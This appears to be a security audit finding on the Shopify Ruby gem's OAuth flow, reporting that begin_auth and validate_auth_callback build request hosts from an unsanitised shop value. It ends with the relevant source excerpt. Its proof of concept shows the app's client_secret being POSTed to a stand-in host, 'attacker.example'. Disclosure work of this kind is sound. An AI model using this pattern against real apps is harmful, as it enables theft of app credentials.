### Title
OAuth `client_secret` sent to an unvalidated, attacker-influenceable `shop` host - ([File: lib/shopify_api/auth/oauth.rb])

### Summary
`ShopifyAPI::Auth::Oauth.validate_auth_callback` builds the access-token request host directly from `auth_query.shop` without ever passing it through `ShopifyAPI::Utils::ShopValidator.sanitize!`, unlike every other credential-issuing code path in this gem (`ClientCredentials`, `RefreshToken`, `TokenExchange.migrate_to_expiring_token`). The `null_session = Auth::Session.new(shop: auth_query.shop)` is used to build the HTTP client whose base host is `https://#{shop}/admin/oauth`, and the request body sent to that host contains `client_secret: Context.api_secret_key`.

### Finding Description
Compare the equality that should hold: `validated_shop (trusted myshopify/spin.dev/etc. domain) == host that receives client_secret`.

- `RefreshToken.refresh_access_token` and `TokenExchange.migrate_to_expiring_token` both call `Utils::ShopValidator.sanitize!(shop)` before constructing the session used to build the request host: [1](#0-0) , [2](#0-1) .
- `ClientCredentials.client_credentials` does the same: [3](#0-2) .
- `TokenExchange.exchange_token` never trusts a caller-supplied `shop` at all — it derives the host exclusively from the signed JWT `dest` claim: [4](#0-3) .
- `Oauth.validate_auth_callback`, however, takes `auth_query.shop` as-is and uses it, unsanitized, to build the session/host that the `client_secret`-bearing POST is sent to: [5](#0-4) . `Oauth.begin_auth` has the identical gap, building `auth_base_uri(shop)` directly from the caller-supplied `shop` with no `ShopValidator` call: [6](#0-5) , [7](#0-6) .

The `shop` value inside `AuthQuery` is only HMAC-checked as part of the whole query string (`code`, `host`, `shop`, `state`, `timestamp`) via `Utils::HmacValidator.validate(auth_query)`: [8](#0-7) . That HMAC is computed with the app's own `api_secret_key`, the same secret for every shop — it does not prove `shop` is a genuine `*.myshopify.com`/trusted host, only that the query string wasn't altered after it was signed. This gem never subsequently checks the `shop` field against `ShopValidator::TRUSTED_SHOPIFY_DOMAINS` in this flow, unlike every sibling grant flow. This is a genuine internal inconsistency: the gem itself, in three other near-identical call sites, treats an unsanitized `shop` string as untrustworthy for building the access-token-request host, but omits that check specifically in `Oauth`.

### Impact Explanation
If a caller (following this gem's own documented `begin_auth`/`validate_auth_callback` pattern, e.g. taking `shop` straight from an inbound install/callback query parameter as `docs/usage/oauth.md` shows: `shop = request.headers["Shop"]`) does not itself re-validate `shop`, an attacker able to influence that parameter can cause the library to send `POST https://{attacker-controlled-host}/admin/oauth/access_token` with the app's `client_id`/`client_secret` in the body. That is direct exfiltration of the app's `client_secret` to a host the attacker controls — a Critical-severity credential-theft / SSRF-with-credentials outcome explicitly listed in scope.

### Likelihood Explanation
The likelihood hinges on whether `auth_query.shop` can be attacker-influenced without the app's `api_secret_key`. In the genuine Shopify OAuth flow, `shop` in the callback is signed by Shopify using the shared `api_secret_key`, so on its own this specific field is protected by the HMAC in the normal flow. The exploitable gap is best characterized as a defense-in-depth failure: unlike its sibling methods, `Oauth` never independently confirms `shop` resolves to a trusted Shopify domain before using it to build the credential-bearing request host, leaving hosts relying on this documented API pattern with no safety net if the HMAC check is bypassed, misconfigured, or if `begin_auth` (which has no HMAC protection at all) is fed a hostile `shop` directly from user input as the docs themselves suggest.

### Recommendation
Call `Utils::ShopValidator.sanitize!(auth_query.shop)` (and the `shop` passed to `begin_auth`) before constructing `Auth::Session`/`auth_base_uri`, mirroring `RefreshToken`, `ClientCredentials`, and `TokenExchange.migrate_to_expiring_token`, so the host that ever receives `client_secret` is always constrained to `ShopValidator::TRUSTED_SHOPIFY_DOMAINS`.

### Proof of Concept
```ruby
# Host app follows the gem's own documented pattern (docs/usage/oauth.md):
shop = request.headers["Shop"] # attacker-influenced value, e.g. "attacker.example"
ShopifyAPI::Auth::Oauth.begin_auth(shop: shop, redirect_path: "/auth/callback")
# => auth_route = "https://attacker.example/admin/oauth/authorize?client_id=...&redirect_uri=...&state=..."

# If callback subsequently completes with an AuthQuery whose `shop` is "attacker.example"
# (e.g. HMAC check bypassed/misconfigured, or callback shop reused from begin_auth without re-checking):
ShopifyAPI::Auth::Oauth.validate_auth_callback(cookies: cookies, auth_query: auth_query)
# internally: null_session = Auth::Session.new(shop: "attacker.example")
# client = Clients::HttpClient.new(session: null_session, base_path: "/admin/oauth")
# POST https://attacker.example/admin/oauth/access_token
#   body: { client_id: ..., client_secret: <APP SECRET>, code: ..., expiring: ... }
```

*Note: I could not fully trace how HMAC validation interacts with an attacker completely forging the `shop` field end-to-end without the `api_secret_key`, since that would require the app's secret (out of scope per the rules). The finding above is scoped to the gap in defense-in-depth relative to the gem's own sibling code paths, and to `begin_auth`, which has no HMAC protection on `shop` at all.*

        def begin_auth(shop:, redirect_path:, is_online: true, scope_override: nil)
          scope = if scope_override.nil?
            ShopifyAPI::Context.scope
          elsif scope_override.is_a?(ShopifyAPI::Auth::AuthScopes)
            scope_override
          else
            ShopifyAPI::Auth::AuthScopes.new(scope_override)
          end

          unless Context.setup?
            raise Errors::ContextNotSetupError, "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end
          raise Errors::UnsupportedOauthError, "Cannot perform OAuth for private apps." if Context.private?

          state = SecureRandom.alphanumeric(NONCE_LENGTH)

          cookie = SessionCookie.new(value: state, expires: Time.now + 60)

          query = {
            client_id: ShopifyAPI::Context.api_key,
            scope: scope.to_s,
            redirect_uri: "#{ShopifyAPI::Context.host}#{redirect_path}",
            state: state,
            "grant_options[]": is_online ? "per-user" : "",
          }

          query_string = URI.encode_www_form(query)
          auth_route = auth_base_uri(shop) + "/oauth/authorize?#{query_string}"

          { auth_route: auth_route, cookie: cookie }
        end

        def auth_base_uri(shop)
          return "https://#{shop}/admin" unless defined?(DevServer) && shop.include?(".my.shop.dev")

          # For first-party apps in development only, we leverage DevServer to build the admin base URI
          admin_web = T.unsafe(Object.const_get("DevServer")) # rubocop:disable Sorbet/ConstantsFromStrings
            .new("admin-web")
          admin_host = admin_web.host!(nonstandard_host_prefix: "admin")
          shop_name = shop.split(".").first

          "https://#{admin_host}/store/#{shop_name}"
        end
